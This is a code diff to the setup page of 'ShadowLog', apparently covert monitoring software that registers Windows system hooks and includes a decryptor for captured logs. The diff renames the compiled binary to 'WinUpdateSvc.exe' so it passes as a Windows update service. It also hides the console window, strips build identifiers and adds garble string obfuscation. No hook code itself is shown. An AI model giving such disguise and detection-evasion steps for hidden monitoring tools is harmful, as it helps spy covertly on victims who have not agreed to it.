@@ -40,8 +40,9 @@ export default function SetupTabs() {
           <div className="stepNumber" aria-hidden="true">02</div>
           <div className="stepContent">
             <h4>Run as Administrator</h4>
-            <p>Run <code>ShadowLog.exe</code> with administrator privileges to start the setup wizard.</p>
-            <p className="stepNote">A terminal window may briefly flash while system hooks are being registered. This is normal behavior.</p>
+            <p>Run the core executable with administrator privileges to start the setup wizard.</p>
+            <p className="stepNote">If run without Administrator privileges, the tool will trigger a native Windows warning and terminate to prevent silent hooking failures.</p>
+            <p className="stepNote">A terminal window may briefly flash while system hooks are being successfully registered. This is normal behavior.</p>
           </div>
         </div>
 
@@ -75,8 +76,9 @@ export default function SetupTabs() {
           <div className="stepContent">
             <h4>Prerequisites</h4>
             <ul className="substepList">
-              <li><strong>Go 1.21+</strong> — Required for compilation</li>
+              <li><strong>Go 1.21+</strong> — Required for compilation (1.26+ recommended for garble obfuscation)</li>
               <li><strong>Windows 10/11</strong> — Target environment for native system hooks</li>
+              <li><strong>garble</strong> (Optional) — <code>go install mvdan.cc/garble@latest</code> for string literal obfuscation</li>
             </ul>
           </div>
         </div>
@@ -98,12 +100,12 @@ export default function SetupTabs() {
             <p>Generate optimized, stripped binaries:</p>
             <div className="codeBlock">
               <code>
-                <span className="codeComment"># Core Monitor &amp; Setup</span><br/>
-                go build -ldflags &quot;-s -w&quot; -o ShadowLog.exe main.go<br/><br/>
+                <span className="codeComment"># Core Monitor</span><br/>
+                go build -trimpath -ldflags &quot;-H windowsgui -s -w -buildid=&quot; -o WinUpdateSvc.exe main.go<br/><br/>
                 <span className="codeComment"># Forensic Decryptor</span><br/>
-                go build -ldflags &quot;-s -w&quot; -o Decryptor.exe decryptor/main.go<br/><br/>
+                go build -trimpath -ldflags &quot;-H windowsgui -s -w -buildid=&quot; -o Decryptor.exe decryptor/main.go<br/><br/>
                 <span className="codeComment"># System Uninstaller</span><br/>
-                go build -ldflags &quot;-s -w&quot; -o Uninstaller.exe uninstaller/main.go
+                go build -trimpath -ldflags &quot;-H windowsgui -s -w -buildid=&quot; -o Uninstaller.exe uninstaller/main.go
               </code>
             </div>
           </div>
